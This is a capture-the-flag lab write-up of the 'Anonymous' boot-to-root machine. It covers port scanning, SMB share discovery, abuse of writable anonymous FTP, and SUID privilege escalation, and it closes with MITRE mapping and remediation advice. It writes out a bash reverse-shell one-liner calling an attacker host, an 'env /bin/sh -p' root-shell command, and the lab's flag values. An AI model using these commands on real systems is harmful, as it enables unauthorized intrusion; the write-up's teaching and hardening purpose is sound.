# Anonymous (FTP Anonymous Access to Root)

**Category:** Offensive Security / Boot-to-Root
**Skills demonstrated:** Service enumeration, SMB share discovery, anonymous FTP abuse, reverse shell deployment, SUID/GTFOBins privilege escalation

---

## 1. Scenario

The target exposed a small service footprint — FTP and SMB — with no web application attack surface at all. The engagement objective was a full boot-to-root compromise, relying entirely on a misconfigured FTP service that permitted anonymous, writable access, followed by a straightforward SUID-binary privilege escalation to reach root.

## 2. Objectives

1. Enumerate all exposed network services.
2. Identify and abuse an anonymous-access misconfiguration to gain initial code execution.
3. Establish an interactive shell.
4. Capture the user flag.
5. Identify and exploit a local privilege-escalation vector.
6. Capture the root flag.

## 3. Reconnaissance

A full TCP port scan was run to establish the target's service footprint:

```bash
nmap -p- <target-ip>
```

**Results:**

| Port | Service |
|---|---|
| 21 | FTP |
| 139, 445 | SMB |

With no web service exposed, the entire attack surface consisted of file-sharing protocols — narrowing the investigation to credential/access misconfigurations on FTP and SMB rather than application-layer vulnerabilities.

## 4. SMB Enumeration

Available SMB shares were enumerated:

```bash
smbclient -L <target-ip>
```

**Finding:** a share named `pics` was identified. At this stage, no credentials were yet available to access its contents, so attention shifted to the FTP service to establish an initial foothold.

## 5. Initial Access — Anonymous FTP Abuse

A connection to the FTP service was attempted using the `anonymous` account, a legacy default that many FTP servers still permit for read-only (and, in this case, write-enabled) access if not explicitly disabled:

```bash
ftp <target-ip>
# Username: anonymous
# Password: (blank / any value)
```

Authentication succeeded, confirming the FTP service allowed **unauthenticated anonymous login**. Critically, the session also allowed **write access** to at least one directory (`scripts`), which is what elevated this from a simple information-disclosure issue into a full remote code execution vector.

A shell script (`clean.sh`) was uploaded into the writable directory:

```
put clean.sh
```

The script was then edited to contain a standard reverse shell one-liner:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

The exact mechanism by which this script was subsequently executed on the target (e.g., a scheduled task or an operator/automation process periodically running scripts placed in this directory) was not directly confirmed during the engagement, but the outcome — code execution as a result of the uploaded file being run — was consistent with this being a monitored/executed script location.

## 6. Establishing the Shell

A listener was started on the attacking machine ahead of the script's expected execution:

```bash
nc -nlvp 4444
```

Once the uploaded script executed on the target, a reverse shell connection was received, granting interactive access to the host.

## 7. Capturing the User Flag

With shell access established, the user's directory was reviewed:

```bash
ls
cd pics
cat user.txt
```

**User Flag:** `90d6f992585815ff991e68748c414740`

Notably, the `pics` directory located here matches the SMB share identified during earlier enumeration — confirming that the same directory was reachable via both SMB and the local filesystem, and that the flag could have alternatively been retrieved via SMB once appropriate access was available.

## 8. Privilege Escalation — SUID Binary Abuse

Standard SUID-binary enumeration was performed to identify local privilege-escalation opportunities:

```bash
find / -user root -perm -u=s 2>/dev/null
```

This surfaced `/usr/bin/env` as SUID-root — a binary not typically expected to carry the SUID bit, and one with a well-documented escalation path. Cross-referencing this finding against **GTFOBins** confirmed that `env`, when SUID, can be used to spawn a shell that inherits the elevated (root) privileges of the binary itself:

```bash
env /bin/sh -p
whoami
```

This returned **root**, completing the privilege escalation with a single command and no further exploitation required.

## 9. Capturing the Root Flag

With root access confirmed, the final flag was retrieved:

```bash
cd /root
cat root.txt
```

**Root Flag:** `4d930091c31a622a7ed10f27999af363`

## 10. Attack Chain Summary

```
Nmap recon → FTP (21), SMB (139/445) only
      │
      ▼
smbclient -L → "pics" share identified (no credentials yet)
      │
      ▼
Anonymous FTP login → write access confirmed in "scripts" directory
      │
      ▼
Malicious clean.sh uploaded (bash reverse shell)
      │
      ▼
Netcat listener → script executes → interactive shell obtained
      │
      ▼
pics/user.txt → User Flag captured
      │
      ▼
find (SUID enumeration) → /usr/bin/env flagged
      │
      ▼
GTFOBins: env /bin/sh -p → root shell
      │
      ▼
/root/root.txt → Root Flag captured
```

## 11. Vulnerability & Exploitation Assessment

| # | Finding | Severity | Root Cause |
|---|---|---|---|
| 1 | Anonymous FTP login enabled | High | FTP server left with default/legacy anonymous access enabled |
| 2 | Anonymous FTP session granted write access to a server directory | Critical | Overly permissive FTP directory permissions combined with anonymous access, enabling arbitrary file upload |
| 3 | Uploaded script executed on the target with no apparent validation | Critical | Untrusted file execution — files placed via FTP were processed/run without integrity or origin checks |
| 4 | SUID bit set on `/usr/bin/env` | Critical | Misconfigured file permissions granting a general-purpose binary root-equivalent execution capability |

## 12. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Reconnaissance | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) | Active Scanning: Scanning IP Blocks | Full Nmap port scan |
| Discovery | [T1135](https://attack.mitre.org/techniques/T1135/) | Network Share Discovery | `smbclient -L` enumeration of the `pics` share |
| Initial Access | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) | Valid Accounts: Default Accounts | Anonymous FTP login using the default/legacy `anonymous` account |
| Persistence / Execution | [T1505](https://attack.mitre.org/techniques/T1505/) | Server Software Component *(general — malicious script staged via a writable service directory)* | `clean.sh` uploaded via FTP and subsequently executed |
| Execution | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command and Scripting Interpreter: Unix Shell | Bash reverse shell payload |
| Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | `find` enumeration for SUID binaries |
| Privilege Escalation | [T1548.001](https://attack.mitre.org/techniques/T1548/001/) | Abuse Elevation Control Mechanism: Setuid and Setgid | SUID `/usr/bin/env` abused per GTFOBins to obtain a root shell |

## 13. Remediation Recommendations

| Finding | Recommendation |
|---|---|
| Anonymous FTP enabled | Disable anonymous FTP access entirely unless explicitly required, and if required, restrict it to strictly read-only, non-sensitive directories |
| Writable FTP directory | Apply least-privilege file permissions; anonymous or low-trust sessions should never have write access to any directory, especially one that is executed or monitored |
| Untrusted script execution | Remove any automation that executes files dropped into shared/uploadable directories without validation, code signing, or manual review |
| SUID on `/usr/bin/env` | Remove the SUID bit from `env` and any other general-purpose utility that does not require it; audit all SUID/SGID binaries regularly against GTFOBins |

## 14. Key Takeaways

- **Legacy protocol defaults remain a real-world risk.** Anonymous FTP is decades old as a misconfiguration category, yet it remains a fully functional initial-access vector whenever left enabled without restriction.
- **Write access is the difference between disclosure and compromise.** Anonymous read access alone would have limited this engagement to information gathering; the writable `scripts` directory is what converted the FTP misconfiguration into full remote code execution.
- **SUID auditing is a fast, high-value privilege-escalation check.** A single `find` command and a GTFOBins lookup took this engagement from a low-privileged shell to root in seconds — this should be one of the first checks performed on any newly obtained foothold.

## 15. Conclusion

This engagement demonstrates that legacy, low-effort misconfigurations — anonymous FTP with write access, combined with a stray SUID binary — remain sufficient for a complete, unauthenticated compromise from network access to root. No advanced exploitation techniques were required at any stage; both the initial foothold and the privilege escalation relied entirely on identifying and abusing standard, well-documented misconfiguration patterns.

